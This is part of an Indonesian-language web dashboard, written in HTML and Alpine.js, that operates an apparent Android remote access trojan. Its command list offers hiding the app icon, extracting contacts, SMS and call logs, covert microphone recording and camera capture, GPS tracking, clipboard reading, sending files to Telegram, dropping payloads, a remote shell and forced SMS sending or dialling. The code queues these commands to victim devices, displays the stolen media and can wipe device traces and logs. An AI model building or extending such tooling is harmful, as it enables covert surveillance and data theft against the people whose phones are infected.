                    <svg class="w-5 h-5 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z">
                        </path>
                    </svg>
                    Data Transmisi Sistem
                </h3>
                <button @click="closeDetailModal()"
                    class="text-gray-400 hover:text-white transition-colors p-1 rounded-lg hover:bg-gray-700 focus:outline-none">
                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12">
                        </path>
                    </svg>
                </button>
            </div>

            <div class="p-4 md:p-5 overflow-y-auto flex-1 bg-gray-900 pointer-events-auto">
                <div x-show="isLoadingDetail" class="flex flex-col items-center justify-center py-12 gap-3">
                    <svg class="animate-spin h-8 w-8 text-primary" xmlns="http://www.w3.org/2000/svg" fill="none"
                        viewBox="0 0 24 24">
                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4">
                        </circle>
                        <path class="opacity-75" fill="currentColor"
                            d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
                        </path>
                    </svg>
                    <span class="text-gray-400 text-sm">Menyelaraskan data log...</span>
                </div>

                <div x-show="!isLoadingDetail && detailLog" class="space-y-4">
                    <!-- General Info Card -->
                    <div
                        class="bg-gray-800 p-4 rounded-xl border border-gray-700 grid grid-cols-2 md:grid-cols-4 gap-4">
                        <div>
                            <span class="block text-xs text-gray-500 font-semibold mb-1">Device ID</span>
                            <span class="text-sm font-mono text-white break-words"
                                x-text="detailLog?.log?.device_id || '-'"></span>
                        </div>
                        <div>
                            <span class="block text-xs text-gray-500 font-semibold mb-1">Status</span>
                            <span class="inline-block px-2 py-0.5 rounded text-xs font-bold"
                                :class="{'bg-red-500/20 text-red-500': detailLog?.log?.level === 'ERROR', 'bg-green-500/20 text-green-500': detailLog?.log?.level === 'INFO', 'bg-yellow-500/20 text-yellow-500': detailLog?.log?.level === 'WARN'}"
                                x-text="detailLog?.log?.level || '-'"></span>
                        </div>
                        <div>
                            <span class="block text-xs text-gray-500 font-semibold mb-1">Waktu</span>
                            <span class="text-sm text-gray-300 break-words"
                                x-text="detailLog?.log?.created_at || '-'"></span>
                        </div>
                        <div class="truncate">
                            <span class="block text-xs text-gray-500 font-semibold mb-1">Command ID</span>
                            <span class="text-sm font-mono text-gray-300"
                                x-text="detailLog?.log?.command_id || 'Otomatis Server'"></span>
                        </div>
                    </div>

                    <!-- JSON Viewer -->
                    <div>
                        <span class="block text-sm font-semibold text-gray-300 mb-2 mt-2">Payload (Raw JSON)</span>
                        <div
                            class="bg-[#1e1e1e] rounded-xl border border-gray-700 overflow-hidden text-sm relative group">
                            <button @click="copyToClipboard(JSON.stringify(detailLog?.parsedBody, null, 2))"
                                class="absolute top-2 right-2 bg-gray-700/50 hover:bg-gray-600 text-gray-300 p-1.5 rounded opacity-0 md:group-hover:opacity-100 transition-opacity"
                                title="Salin JSON">
                                <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z">
                                    </path>
                                </svg>
                            </button>
                            <pre class="p-3 md:p-4 overflow-x-auto text-blue-300 font-mono text-xs leading-relaxed"
                                x-text="JSON.stringify(detailLog?.parsedBody, null, 2)"></pre>
                        </div>
                    </div>

                    <!-- Media Render if applicable -->
                    <div x-show="detailLog?.parsedBody?.type === 'photo_url' || detailLog?.parsedBody?.type === 'audio_url'"
                        class="pt-2 border-t border-gray-800">
                        <span class="block text-sm font-semibold text-gray-300 mb-2"
                            x-text="detailLog?.parsedBody?.type === 'photo_url' ? 'Pratinjau Media Visual' : 'Pemutar Audio'"></span>
                        <div class="bg-gray-800 p-4 rounded-xl border border-gray-700 flex justify-center">
                            <template x-if="detailLog?.parsedBody?.type === 'photo_url'">
                                <img :src="detailLog?.parsedBody?.data"
                                    class="max-w-full h-auto max-h-[400px] rounded-lg shadow-lg border border-gray-600 object-contain"
                                    alt="Media Viewer" />
                            </template>
                            <template x-if="detailLog?.parsedBody?.type === 'audio_url'">
                                <audio :src="detailLog?.parsedBody?.data" controls
                                    class="w-full max-w-full md:max-w-md"></audio>
                            </template>
                        </div>
                    </div>
                </div>
            </div>

            <div class="p-4 border-t border-gray-700 bg-gray-800 flex justify-end">
                <button @click="closeDetailModal()"
                    class="w-full md:w-auto bg-gray-700 hover:bg-gray-600 text-white px-5 py-2.5 rounded-lg text-sm font-semibold transition-all transform active:scale-95 focus:ring-2 focus:ring-gray-500 focus:outline-none">Tutup
                    Detail</button>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('alpine:init', () => {
            Alpine.data('dashboard', () => ({
                devices: [],
                logs: [],
                hostLogs: [],
                activeTab: 'system',
                selectedDevice: null,
                cmdInput: '',
                textInput: '',
                isSending: false,
                isFetchingDevices: false,
                isFetchingLogs: false,
                clearLogDays: 0,
                toasts: [],
                toastId: 0,
                isDetailModalOpen: false,
                isLoadingDetail: false,
                detailLog: null,

                isConfirmOpen: false,
                confirmTitle: '',
                confirmMessage: '',
                onConfirm: null,

                availableCommands: [
                    { name: 'ping', desc: 'Tes koneksi Background (respon pong seketika)', needsPayload: false },
                    { name: 'get_device_info', desc: 'Tarik Merk, Versi OS', needsPayload: false },
                    { name: 'get_battery', desc: 'Cek persentase baterai', needsPayload: false },
                    { name: 'show_toast', desc: 'Tampilkan pop-up toast. Payload: [text]', needsPayload: true },
                    { name: 'get_volume', desc: 'Info Volume Ring, Alarm, Notif', needsPayload: false },
                    { name: 'set_volume', desc: 'Atur volume. Payload: [type] [level] (Cth: music 15)', needsPayload: true },
                    { name: 'vibrate', desc: 'Getar paksa target. Payload: [durasi detik]', needsPayload: true },
                    { name: 'hide_app', desc: 'Sembunyikan ikon aplikasi/Launcher Icon', needsPayload: false },
                    { name: 'torch', desc: 'Matikan/Nyalakan Senter. Payload: on / off', needsPayload: true },
                    { name: 'sensors', desc: 'Tarik daftar semua sensor manufaktur', needsPayload: false },
                    { name: 'photo front', desc: 'Uji Kamera Belakang/Selfie Base64', needsPayload: false },
                    { name: 'photo back', desc: 'Uji Kamera Belakang resolusi tinggi', needsPayload: false },
                    { name: 'record_sound', desc: 'Rekam mik audio MP4. Payload: [durasi detik]', needsPayload: true },
                    { name: 'location', desc: 'Tangkap titik GPS Lat/Lon', needsPayload: false },
                    { name: 'wifi_scan', desc: 'List jaringan WiFi di sekitar target', needsPayload: false },
                    { name: 'contacts', desc: 'Ekstrak seluruh Data Kontak', needsPayload: false },
                    { name: 'sms_list', desc: 'Tarik SMS Inbox masuk', needsPayload: false },
                    { name: 'sms_send', desc: 'Background SMS. Payload: [nomor]|[pesan]', needsPayload: true },
                    { name: 'clipboard', desc: 'Baca teks Copy/Paste terbaru', needsPayload: false },
                    { name: 'get_call_logs', desc: 'Riwayat Telepon. Payload: [limit]', needsPayload: true },
                    { name: 'get_installed_apps', desc: 'Tarik skema Package Name & App Terinstall', needsPayload: false },
                    { name: 'ls', desc: 'Jelajah File Explorer. Payload: [path] (Cth: /sdcard/)', needsPayload: true },
                    { name: 'download', desc: 'Sedot file dari remote target ke telegram', needsPayload: false },
                    { name: 'upload', desc: 'Remote Upload payload script/file dropping', needsPayload: true },
                    { name: 'shell', desc: 'Tarik BASH Terminal interaktif. Payload: [command]', needsPayload: true },
                    { name: 'notify', desc: 'Kirim Push Notification. Payload: [Title]|[Body]', needsPayload: true },
                    { name: 'open_url', desc: 'Paksa target membuka link/browser. Payload: [link]', needsPayload: true },
                    { name: 'set_wallpaper', desc: 'Ganti Background Layar instan. Payload: [url_gambar]', needsPayload: true },
                    { name: 'dial_number', desc: 'Panggil Nomor Telepon/USSD. Payload: [nomor]', needsPayload: true },
                    { name: 'play_alarm', desc: 'Bunyikan Alarm Bypass DND volume maksimal', needsPayload: false },
                    { name: 'tts', desc: 'Suara Google TTS dari Speaker. Payload: [teks pesan]', needsPayload: true },
                    { name: 'play_sound', desc: 'Putar File Latar Audio. Payload: [url_mp3]', needsPayload: true }
                ],
                filteredCommands: [],
                showAutocomplete: false,
                hoverIndex: 0,
                expandedLogs: {},

                init() {
                    this.fetchDevices();
                    this.fetchLogs();
                    setInterval(() => {
                        this.fetchDevices();
                        this.fetchLogs();
                    }, 5000);
                },

                async fetchDevices() {
                    this.isFetchingDevices = true;
                    try {
                        const res = await fetch('/admin/api/devices');
                        if (res.ok) {
                            const data = await res.json();
                            this.devices = data.devices;
                        } else {
                            if (res.status === 403) {
                                window.location.reload();
                            } else {
                                const errData = await res.json().catch(() => ({}));
                                this.showToast('Gagal memuat perangkat: ' + (errData.error || res.statusText), 'error');
                            }
                        }
                    } catch (e) {
                        console.error('Gagal memuat perangkat', e);
                        this.showToast('Gangguan koneksi saat memuat perangkat.', 'error');
                    } finally {
                        setTimeout(() => this.isFetchingDevices = false, 500);
                    }
                },

                async fetchLogs() {
                    this.isFetchingLogs = true;
                    try {
                        const res = await fetch('/admin/api/logs');
                        if (res.ok) {
                            const data = await res.json();
                            this.logs = data.logs;
                            this.hostLogs = data.hostLogs || [];
                        } else {
                            if (res.status !== 403) {
                                const errData = await res.json().catch(() => ({}));
                                this.showToast('Gagal memuat log: ' + (errData.error || res.statusText), 'error');
                            }
                        }
                    } catch (e) {
                        console.error('Gagal memuat log', e);
                        this.showToast('Gangguan koneksi saat memuat log.', 'error');
                    } finally {
                        setTimeout(() => this.isFetchingLogs = false, 500);
                    }
                },

                async togglePollingMode(devId, currentMode) {
                    const nextMode = currentMode === 'short' ? 'long' : 'short';
                    const label = nextMode === 'short' ? 'Turbo' : 'Normal';
                    try {
                        const res = await fetch('/admin/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                device_id: devId,
                                command: 'set_polling_mode',
                                text: nextMode
                            })
                        });
                        if (res.ok) {
                            this.showToast('Berhasil mengirim perintah ganti ke mode ' + label, 'success');
                            this.fetchDevices();
                        } else {
                            this.showToast('Gagal mengubah mode polling.', 'error');
                        }
                    } catch (e) {
                        this.showToast('Gangguan jaringan saat mengubah mode.', 'error');
                    }
                },

                customConfirm(title, message, onConfirmCallback) {
                    this.confirmTitle = title;
                    this.confirmMessage = message;
                    this.onConfirm = onConfirmCallback;
                    this.isConfirmOpen = true;
                    document.body.style.overflow = 'hidden';
                },

                closeConfirm() {
                    this.isConfirmOpen = false;
                    this.onConfirm = null;
                    if (!this.isDetailModalOpen) {
                        document.body.style.overflow = '';
                    }
                },

                async deleteDevice(id) {
                    this.customConfirm('Hapus Perangkat', 'Apakah Anda yakin ingin menghapus jejak perangkat ini beserta seluruh riwayat log dan perintahnya?', async () => {
                        try {
                            const res = await fetch('/admin/api/device/' + id, { method: 'DELETE' });
                            if (res.ok) {
                                this.showToast('Perangkat ' + id + ' berhasil diblokir/dihapus.', 'success');
                                if (this.selectedDevice === id) this.selectedDevice = null;
                                this.fetchDevices();
                                this.fetchLogs();
                            } else {
                                this.showToast('Gagal menghapus perangkat.', 'error');
                            }
                        } catch (e) {
                            this.showToast('Gangguan jaringan saat menghapus.', 'error');
                        }
                    });
                },

                async clearLogs() {
                    this.customConfirm('Hapus Log Sistem', 'Hati-hati! Ini akan membersihkan riwayat log dan perintah di sistem berdasarkan filter tanggal. Lanjutkan?', async () => {
                        try {
                            const res = await fetch('/admin/api/logs?days=' + this.clearLogDays, { method: 'DELETE' });
                            if (res.ok) {
                                this.showToast('Log dan riwayat perintah berhasil dibersihkan.', 'success');
                                this.fetchLogs();
                            } else {
                                this.showToast('Gagal membersihkan log.', 'error');
                            }
                        } catch (e) {
                            this.showToast('Gangguan jaringan saat membersihkan.', 'error');
                        }
                    });
                },

                async clearHostLogs() {
                    this.customConfirm('Kosongkan Stderr.log', 'Peringatan! File error log server akan dikosongkan secara permanen. Lanjutkan?', async () => {
                        try {
                            const res = await fetch('/admin/api/host-logs', { method: 'DELETE' });
                            if (res.ok) {
                                this.showToast('File stderr.log berhasil dikosongkan.', 'success');
                                this.fetchLogs();
                            } else {
                                this.showToast('Gagal mengosongkan log hosting.', 'error');
                            }
                        } catch (e) {
                            this.showToast('Gangguan jaringan saat mengosongkan.', 'error');
                        }
                    });
                },

                async sendCommand() {
                    if (!this.cmdInput.trim() || !this.selectedDevice) return;
                    this.isSending = true;
                    try {
                        const res = await fetch('/admin/api/command', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                device_id: this.selectedDevice,
                                command: this.cmdInput,
                                text: this.textInput
                            })
                        });
                        if (res.ok) {
                            this.showToast('Perintah terkirim ke antrean database!', 'success');
                            this.cmdInput = '';
                            this.textInput = '';
                            this.fetchLogs();
                        } else {
                            const err = await res.json();
                            this.showToast('Gagal: ' + (err.error || 'Server error'), 'error');
                        }
                    } catch (e) {
                        this.showToast('Gangguan Jaringan!', 'error');
                    } finally {
                        this.isSending = false;
                    }
                },

                filterCommands() {
                    const search = this.cmdInput.toLowerCase().trim();
                    if (!search) {
                        this.filteredCommands = this.availableCommands;
                    } else {
                        this.filteredCommands = this.availableCommands.filter(cmd =>
                            cmd.name.toLowerCase().includes(search) || cmd.desc.toLowerCase().includes(search)
                        );
                    }
                    this.hoverIndex = 0;
                },

                selectCommand(cmd) {
                    this.cmdInput = cmd.name;
                    this.showAutocomplete = false;

                    if (cmd.needsPayload) {
                        this.$nextTick(() => {
                            this.$refs.payloadInput.focus();
                        });
                    }
                },

                formatDate(unixSeconds) {
                    if (!unixSeconds || unixSeconds === 0) return 'Belum Aktif';
                    const date = new Date(unixSeconds * 1000);
                    return date.toLocaleString('id-ID', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit', day: '2-digit', month: 'short' });
                },

                showToast(message, type = 'success') {
                    const id = this.toastId++;
                    this.toasts.push({ id, message, type });
                    setTimeout(() => this.dismissToast(id), 4000);
                },

                dismissToast(id) {
                    this.toasts = this.toasts.filter(t => t.id !== id);
                },

                async openDetailModal(id) {
                    this.isDetailModalOpen = true;
                    document.body.style.overflow = 'hidden';
                    this.isLoadingDetail = true;
                    this.detailLog = null;
                    try {
                        const res = await fetch('/admin/api/log/' + id);
                        if (res.ok) {
                            this.detailLog = await res.json();
                        } else {
                            this.showToast('Gagal memuat detail log (404)', 'error');
                            this.closeDetailModal();
                        }
                    } catch (e) {
                        this.showToast('Gangguan koneksi memuat detail', 'error');
                        this.closeDetailModal();
                    } finally {
                        this.isLoadingDetail = false;
                    }
                },

                closeDetailModal() {
                    this.isDetailModalOpen = false;
                    if (!this.isConfirmOpen) {
                        document.body.style.overflow = '';
                    }
                    setTimeout(() => { this.detailLog = null; }, 300);
                },

                copyToClipboard(text) {
                    navigator.clipboard.writeText(text).then(() => {
                        this.showToast('Data Disalin!', 'success');
                    }).catch(err => {
                        this.showToast('Gagal menyalin', 'error');
                    });
                }
            }))
        });
    </script>
</body>

</html>